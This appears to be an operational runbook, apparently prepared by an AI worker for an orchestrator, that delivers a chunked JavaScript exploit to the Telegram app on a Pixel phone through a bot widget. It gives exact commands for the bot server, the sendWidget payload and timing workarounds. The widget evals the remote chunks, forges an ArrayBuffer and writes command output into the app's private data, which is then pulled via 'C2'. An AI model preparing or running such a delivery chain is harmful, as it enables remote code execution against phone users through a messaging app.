> **Historical engineering note.** Paths inside this file refer to the
> original lab tree (`lab/...`, `/tmp/opencode/...`). They are kept for
> provenance. The current paths and the clean commands are in the directory
> `README.md` and in `docs/`. No token file is included in this repository.

# LIVE RUNBOOK: out-of-band endgame on the Pixel 72801 (approved)

Host-side package for the orchestrator. This worker does not touch the device,
does not start the poller, and does not send anything. Pixel crash-log-only;
iPhone/Sony untouched.

Everything is under `lab/pixel72801_route2/oob/`.

## 0. Inventory (verified)

| file | size | note |
|---|---|---|
| `s2oob_device_72801.html` | 2,151 B / **1,024 zlib9** | widget: probe stage A (byte-identical, sha256 `87434fa765acf8aa…`) + fetch driver; no endgame text. `request()` resolves `{result: string}`, the driver reads `.result` |
| `bot_server.py` | - | answer server; `--self-test` **PASS**, `--simulate` 8 answers, `--probe` |
| `bot_config.example.json` | 834 B | exact sendWidget body + server config |
| `chunks/E0..E7.txt` + `manifest.json` | 7×950 + 819 = **7,469 B** | source sha256 `5200636a47720fe8…`; slice source[950i:950(i+1)] |
| `endgame_72801.js` | 7,469 B | the dynamic Android endgame served in chunks (CMD `id>/data/data/org.telegram.messenger/files/n1`) |
| `driver.js` / `driver.min.js` | 1,424 / 945 B | fetch driver |
| `s2probe_limits_72801.html` | 2,833 B / 1,320 zlib9 | answer-limit probe widget (P0..P8; see §7b) |
| `probe_answers.py` | - | probe answer server; `--self-test` PASS; `data` field only |
| `s2oob_mock_host.html` | - | host mock, `… | HF HF OK` + 162 B proof 3/3 |
| `s2oob_mock_miss.html` / `_empty.html` | - | `… | X3` / `… | F2`, no crash |
| `DESIGN.md` | - | full design/implementation |

## 1. Prerequisites

* Token: `/tmp/opencode/tgbot/token.env` (`TG_BOT_TOKEN=…`). The server reads
  `TG_BOT_TOKEN` or `BOT_TOKEN`.
* **Only one `getUpdates` consumer per token.** Stop the existing
  `/tmp/opencode/tgbot/bot.py` poller before starting this server; otherwise
  the Bot API returns `409 Conflict: terminated by other getUpdates request`.
* If `bot.py` must stay up, do **not** start a second poller: patch its
  `handle_widget_query` answer line to carry the chunk instead
  (`api("answerWidgetQuery", {"widget_query_id": query_id, "result": CHUNKS[i]})`
  after parsing `query["data"]`), or stop it and use `bot_server.py`.
* The widget message must be sent to the **private chat with the bot**
  (`chat_id <CHAT_ID>`) and the user must keep it **visible** (background
  requests require the widget on screen).
* Python 3 stdlib only; no dependencies.

## 2. Offline checks (no network, no widget)

```bash
cd lab/pixel72801_route2
python3 oob/bot_server.py --self-test        # chunks vs manifest, negatives, uid filter -> PASS
python3 oob/bot_server.py --simulate --state-dir oob/state   # 8 dry answers + 2 skips
```

## 3. Verify the beta method name (no widget needed)

The method and parameter shape are confirmed by the orchestrator's working
`bot.py` (update `widget_query`, method `answerWidgetQuery`,
`widget_query_id`) and by the widget-format reference
(`lab/qjs_fork_audit/widget-sandbox/docs/tgw-format.md`): **the Bot API
parameter carrying the chunk is `data`**, not `result` (MTProto
`setBotWidgetQueryAnswer.result`). `result` is silently ignored (`ok=True`,
empty answer; the 16807/16808 `F0`). The server now sends
`{"widget_query_id": id, "data": chunk}` (fields order `data,result,text`). One call confirms the method exists without any widget:

```bash
set -a; . /tmp/opencode/tgbot/token.env; set +a
python3 oob/bot_server.py --probe
# PROBE answerWidgetQuery -> EXISTS {"ok":false,...}   (query-level error = method exists)
# PROBE answerWidgetQuery -> MISSING 404               -> falls back to setBotWidgetQueryAnswer
```

The server tries `data` first (`--fields data,result,text`) and logs
`ANSWER … field=data ok=True`; the other names are harmless aliases the beta
ignores, so `data` must be the one carrying the chunk. The answer must be
text and <=1024 **bytes**, within **15 s** of the query. If a run still
returns an empty `{result}`, use the diagnostic widget
(`oob/s2oob_diag_72801.html`) which prints the raw shape
(`T=object K=result RT=string L=… H=…`).

## 4. Start the server

```bash
cd lab/pixel72801_route2
set -a; . /tmp/opencode/tgbot/token.env; set +a
python3 oob/bot_server.py \
  --uid 10290 \
  --chunks oob/chunks \
  --state-dir oob/state \
  --method answerWidgetQuery
```

Expected log: `START method=answerWidgetQuery uid=10290 chunks=8`, then one
`ANSWER … i=<n> len=<len> field=data ok=True` per chunk and `FIELD data
accepted` on the first. Log file: `oob/state/server.log`. (The beta ignores
the aliases `result`/`text`; if the log shows `field=result`, the running
server is stale; restart it.)

## 5. Verify getUpdates sees the bot

```bash
curl -s "https://api.telegram.org/beta/bot$TG_BOT_TOKEN/getMe" | head -c 300
```

and (with the poller stopped) the server's `START` line plus no `409` in
`oob/state/server.log`. A `/start` or any message to the bot increments the
stream; the server skips non-widget updates silently.

## 6. Send the widget (exact body)

`POST https://api.telegram.org/beta/bot<TG_BOT_TOKEN>/sendWidget`,
`application/json`:

```json
{"chat_id": <CHAT_ID>,
 "html": "<contents of oob/s2oob_device_72801.html>",
 "allow_queries": true,
 "background_query": true}
```

One-liner (reads the file, no shell quoting issues):

```bash
cd lab/pixel72801_route2 && set -a; . /tmp/opencode/tgbot/token.env; set +a
python3 - <<'PY'
import json, os, urllib.request
tok = os.environ["TG_BOT_TOKEN"]
html = open("oob/s2oob_device_72801.html", encoding="utf-8").read()
body = json.dumps({"chat_id": <CHAT_ID>, "html": html,
                   "allow_queries": True, "background_query": True}).encode()
req = urllib.request.Request("https://api.telegram.org/beta/bot%s/sendWidget" % tok,
                             data=body, headers={"Content-Type": "application/json"})
print(json.load(urllib.request.urlopen(req)))
PY
```

## 7. User action

Open the new widget message in the private chat with the bot and **keep it on
screen** for the whole run (~36 s; 7 gaps of 5.2 s after the first answer).
The client sends at most one background request per 5 s (hard limit: 5000 ms,
independent of the server's 5/5 s flood); leaving the screen holds requests,
and each return to the screen resets the 5 s timer (one immediate background
request per appearance).

**Fast path (optional):** the driver can be driven by taps instead of the
timer; each tap on the widget allows one foreground request immediately, and
the server permits 5 requests / 5 s per user+bot. Tapping through the eight
chunks in two 5 s windows finishes in ~5-7 s instead of ~36 s. A tap during a
5.2 s wait advances the chain immediately if the page binds a click handler.
Background `E0..E4` back-to-back is **not** possible: the client refuses the
2nd-5th inside 5 s (`RATE_LIMITED`) and they are retried after 5.2 s.

## 7b. Answer-channel limit probe (optional, before the endgame run)

Purpose: measure the real per-answer limit on the device (the constants are
verified in the shipped code; this confirms the runtime path and the pacing).

1. Stop the endgame server (one `getUpdates` consumer per token).
2. `python3 oob/probe_answers.py --token "$TG_BOT_TOKEN" --uid 10290`
   (`--self-test` first; `--dry-run` logs only).
3. Send `oob/s2probe_limits_72801.html` with the same `sendWidget` body
   (`allow_queries=true`, `background_query=true`), keep it visible.
4. The widget walks P0..P8 with 5.2 s background pacing and prints:
   `@ms P0 LEN=1024 | @ms P1 ERR:INVALID_ANSWER | @ms P2 LEN=512 | … |
    @ms P7 D65=TypeError P7 LEN=4 | @ms P8A … @ms P8B ERR:RATE_LIMITED |
    @ms P8C … | @ms P6 LEN=1024 | @ms P5 LEN=null | DONE`.
   Expected: P0/P2/P6/P7 accepted (1024 B, 1024 B as 512 chars, 1024 control
   chars, 64 B request), P1/P3/P4 refused (>1024 B or 1024 B+NUL), P8B
   `RATE_LIMITED` at ~4900 ms, P8C accepted at ~5100 ms, P5 `{result:null}`
   or a timeout. If P1/P3/P4 show `TIMEOUT` instead of `INVALID_ANSWER`, the
   server refused the answer (`probe.log ok=false`); either way the ceiling
   is 1024 B.
5. Tapping the widget during a wait advances the next step immediately: a
   success <5000 ms after the previous request proves the tap/foreground path.
6. Record `oob/state/probe.log` (ANSWER lines with bytes/ok/err) and the
   logcat slice of §10.

Full detail and the byte/char rationale: `notes/widget_answer_channel_20261108.md`.

## 8. Expected marker and proof

`S1 ABLEN[599]=327744 VLEN=327744 | G1/8` … `| G8/8` → `| HF HF OK`.

Then the endgame runs with the forged AB and writes the proof:
`id>/data/data/org.telegram.messenger/files/n1` (pull via C2/AFC).

## 9. Failure tokens (in the widget marker)

| marker | meaning | action |
|---|---|---|
| `NOAPI` | `TelegramWidget` / `request` missing | wrong sandbox/message type |
| `F<i>` | chunk `i` returned empty/`{result:null}` 3× | check the server sends `data` (not `result`) and the log `ANSWER ... field=data ok=True` |
| `X<i>` | chunk `i` promise rejected 3× | server not answering (poller/token/method/field) |
| `LEN n` | assembled length ≠ 7,469 (no eval) | wrong chunk or slice; check manifest |
| `EV <e>` | assembled source threw in eval | chunk corruption; check per-chunk sha256 |
| `HF ERR <token>` | endgame failed after a successful forge | endgame token (`NOV`, `NOANCHOR`, `NOSYS`, …) |
| `PROMISE` | `request()` did not return a thenable | API shape mismatch |
| `INVALID_ANSWER` (rejection → `X<i>`) | the answer was over 1024 **bytes** or not text | check chunk byte length (all chunks are 950/819 ASCII) |

## 10. Logcat greps (orchestrator)

```bash
adb logcat -d -v time | grep -Ei "widget|twidget|widget_query|no can_query|no background_query|once per 5 s|already in flight|ABLEN|Memory limit|CPU limit" | tail -150
```

Expected refusals only if something is off:
`this message allows no requests … (no can_query …)`,
`… (no background_query)`, `background requests at most once per 5 s`,
`a request is already in flight`.

## 11. What to paste back

1. the widget marker text (or a screenshot),
2. `oob/state/server.log`,
3. the logcat slice above,
4. whether the proof file exists.

That is enough to diagnose every branch in §9 without any device action from
this worker.
